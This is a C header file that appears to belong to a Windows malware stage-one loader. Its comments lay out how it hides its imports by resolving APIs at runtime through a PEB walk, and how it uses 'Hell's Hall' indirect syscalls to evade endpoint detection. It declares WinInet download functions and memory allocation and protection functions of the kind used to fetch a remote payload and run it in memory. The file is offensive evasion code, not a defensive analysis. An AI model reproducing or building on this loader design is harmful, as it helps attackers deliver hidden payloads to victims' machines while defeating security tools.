/*
 * Runtime-resolved Windows API table.
 *
 * Every Windows API used by stage1 is called through `g_api.Name(...)`
 * rather than directly. Pointers are populated once by `resolve_apis`
 * at entry via the PEB walker, so the compiled binary contains no IAT
 * entries for any of these functions.
 *
 * Bootstrap ordering:
 *   1. Walk PEB to find kernel32.dll.
 *   2. Resolve LoadLibraryA + ExitProcess from kernel32.
 *   3. Walk PEB for kernelbase.dll (loaded as kernel32 dep). Resolve
 *      VirtualAlloc, VirtualFree, Sleep from kernelbase (kernel32
 *      forwards them on Win10/11).
 *   4. LoadLibraryA("wininet.dll") — the only string bootstrap needs.
 *   5. Resolve the four WinInet functions.
 *
 * On failure at any step, resolve_apis returns non-zero and g_api is
 * left partially populated. Caller (stage1_entry) must abort via the
 * already-resolved ExitProcess if possible.
 */

#ifndef API_TABLE_H
#define API_TABLE_H

#ifdef _WIN32

#include <windows.h>
#include <wininet.h>

typedef LPVOID  (WINAPI *PFN_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *PFN_VirtualFree)(LPVOID, SIZE_T, DWORD);
typedef void    (WINAPI *PFN_Sleep)(DWORD);
typedef HMODULE (WINAPI *PFN_LoadLibraryA)(LPCSTR);
typedef void    (WINAPI *PFN_ExitProcess)(UINT);
typedef HINTERNET (WINAPI *PFN_InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *PFN_InternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL    (WINAPI *PFN_InternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *PFN_InternetCloseHandle)(HINTERNET);

/* S34: Nt* wrappers populated via Hell's Hall — no IAT entry, no stub
 * execution. Both entries point at naked asm trampolines in syscalls.c. */
typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(
    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(
    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

typedef struct {
    PFN_VirtualAlloc        VirtualAlloc;
    PFN_VirtualFree         VirtualFree;
    PFN_Sleep               Sleep;
    PFN_LoadLibraryA        LoadLibraryA;
    PFN_ExitProcess         ExitProcess;
    PFN_InternetOpenA       InternetOpenA;
    PFN_InternetOpenUrlA    InternetOpenUrlA;
    PFN_InternetReadFile    InternetReadFile;
    PFN_InternetCloseHandle InternetCloseHandle;
    PFN_NtAllocateVirtualMemory NtAllocateVirtualMemory;
    PFN_NtProtectVirtualMemory  NtProtectVirtualMemory;
} api_t;

extern api_t g_api;

/* Populate g_api. Returns 0 on success, non-zero on any failure. */
int resolve_apis(void);

#endif /* _WIN32 */
#endif /* API_TABLE_H */
